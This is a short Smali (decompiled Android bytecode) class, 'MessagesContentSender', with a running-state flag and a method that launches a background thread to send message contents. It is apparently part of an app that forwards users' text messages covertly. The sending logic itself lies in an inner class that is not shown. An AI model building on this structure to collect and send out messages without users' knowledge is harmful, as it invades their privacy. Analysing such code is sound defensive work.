.class public Lorg/slempo/service/utils/MessagesContentSender;
.super Ljava/lang/Object;
.source "MessagesContentSender.java"


# static fields
.field private static IS_SENDING_STARTED:Z


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 20
    const/4 v0, 0x0

    sput-boolean v0, Lorg/slempo/service/utils/MessagesContentSender;->IS_SENDING_STARTED:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 18
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$0(Z)V
    .locals 0

    .prologue
    .line 20
    sput-boolean p0, Lorg/slempo/service/utils/MessagesContentSender;->IS_SENDING_STARTED:Z

    return-void
.end method

.method public static isWorking()Z
    .locals 1

    .prologue
    .line 23
    sget-boolean v0, Lorg/slempo/service/utils/MessagesContentSender;->IS_SENDING_STARTED:Z

    return v0
.end method

.method public static startSending(Landroid/content/Context;)V
    .locals 2
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 27
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lorg/slempo/service/utils/MessagesContentSender$1;

    invoke-direct {v1, p0}, Lorg/slempo/service/utils/MessagesContentSender$1;-><init>(Landroid/content/Context;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 90
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    .line 91
    return-void
.end method
